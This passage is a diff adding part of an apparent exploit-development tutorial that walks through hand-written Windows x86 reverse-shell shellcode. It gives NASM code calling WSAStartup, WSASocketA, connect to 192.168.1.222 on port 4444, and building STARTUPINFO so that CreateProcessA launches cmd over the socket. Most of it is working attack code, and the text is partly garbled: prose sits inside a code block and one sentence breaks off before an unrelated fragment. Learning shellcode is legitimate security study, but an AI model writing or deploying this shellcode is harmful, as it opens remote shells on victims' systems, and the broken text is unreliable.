@@ -342,6 +342,112 @@ call edi
 mov [esi + 0x10], eax ; esi at offset 0x10 will now hold the address of ExitProcess
 ```
 
+Lets check out the stack in Immunity Debugger at this point, and see how all of our addresses look on the stack.
+```
+0022FF60   75353AB2  ²:5u  ws2_32.WSAStartup
+0022FF64   7535E562  bå5u  ws2_32.WSASocketA
+0022FF68   753568F5  õh5u  ws2_32.connect
+0022FF6C   76FD2082  ‚ ýv  kernel32.CreateProcessA
+0022FF70   7702BE5A  Z¾ w  kernel32.ExitProcess
+```
+
+As you can see, we've neatly and safely placed all of our function addresses on the stack and ESI is currently holding the address `0022FF60`. So we can use this pointer to refer to all of our functions with the appropriate offset. 
+
 ### Calling Our Functions
+
+Now that we have our function addresses we can call them and execute our shellcode. If you need to, refer back to the `C++` Prototype for these function calls and their arguments. First we'll call `WSAStartup`. 
+```nasm
+; call WSAStartup
+xor edx, edx
+mov dx, 0x0190
+sub esp, edx
+push esp
+push edx
+call dword [esi]
+```
+
+Here we're specifying the version as a number that's less than the `2.2` we used in our `C++` prototype; however, if you read Marcos' blogpost you will understand why this is acceptable. This also happens to be the size of the `wsaData` structure so we're able to save some bytes by reusing the same value `0x0190`. We `push esp` a pointer to the `wsaData` structure and `push edx` which holds the version number we wish to use (again read Marcos' blogpost for an explanation.)
+
+Notice how at the end we're calling the `DWORD` value held at ESI, this is how we're using those stored addresses to call the functions. The next one will be at `[esi + 0x4]` and then `[esi + 0x8]` and so on. 
+
+Next, we must call `WSASocket`. 
+```nasm
+; call WSASocketA
+push eax                              ; still null from our return code of WSAStartup :)
+push eax
+push eax
+xor edx, edx
+mov dl, 0x6
+push edx
+inc eax
+push eax
+inc eax
+push eax
+call dword [esi + 0x4]
+```
+
+Refer back to the prototype if you're hazy on the function parameters. Three NULLs. `6`. `1`. `2`. Then we call at the `[esi + 0x4]` offset. 
+```nasm
+Next up is `connect`. 
+; call connect
+push 0xde01a8c0                      ; sin_addr set to 192.168.1.222
+push word 0x5c11                     ; port = 4444
+xor ebx, ebx
+add bl, 0x2
+push word bx
+mov edx, esp
+push byte 16
+push edx
+push eax
+xchg eax, edi
+call dword [esi + 0x8]
+```
+This one should be pretty easy to follow along with if you refer back to the `C++` prototype. One confusing thing I'll highlight is the `xchg eax, edi` instruction, this is to store the socket file descriptor we got back from the `WSASocket` call into EDI. It was hanging out in EAX but it's not safe there. Calling this `connect` function will fill EAX with a return value and we need the socket file descriptor for later, so we've saved it in EDI. 
+
+Now comes the hardest function to set-up/understand, `CreateProcessA`. 
+```nasm
+; CreateProcessA shenanigans
+push 0x61646d63                      ; "cmda"
+sub dword [esp + 0x3], 0x61          ; "cmd"
+mov edx, esp                         ; edx now pointer to our 'cmd' string
+```
+This part is easy so far, we have EDX pointing to our `cmd` argument for the function call. 
+
+```nasm
+; set up the STARTUPINFO struct
+push edi
+push edi
+push edi                    ; we just put our SOCKET_FD into the arg params for HANDLE hStdInput; HANDLE hStdOutput; and HANDLE hStdError;
+xor ebx, ebx
+xor ecx, ecx
+add cl, 0x12                ; we're going to throw 0x00000000 onto the stack 18 times, this will fill up both the STARTUPINFO and PROCESS_INFORMATION structs
+                            ; then we will retroactively fill them up with the arguments we need by using effective addressing relative to ESP like mov word [esp +]
+
+looper: 
+push ebx
+loop looper
+```
+
+What we've done here, is `push edi` three times to put our socket file descriptor into the struct members `si.hStdInput`, `si.hStdOutput`,  and `si.hStdError`. 
+
+Next we load our counter register ECX up with an `0x12` value so we can loop through pushing NULLs onto the stack. This will fill up the first of the `STARTUPINFO` struct with NULLs, and also fille the entire `PROCESS_INFO` struct with NULLs. It's ok that `PROCESS_INFO` gets filled with NULLs since it doesn't need any members initialized if you look at the prototype. However, there are still some members left in `STARTUPINFO` we need to initialize. We do this by 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function which requires us to first build the `STARTUPINFO` and `PROCESS_INFORMATION` structs. The way that the Metasploit contributors do this is quite clever, and Marcos discusses it in his blog. I liked this way a lot so I incorporated it into my shellcode and had to make it work with our scheme so far so there was some refining. 
 
 
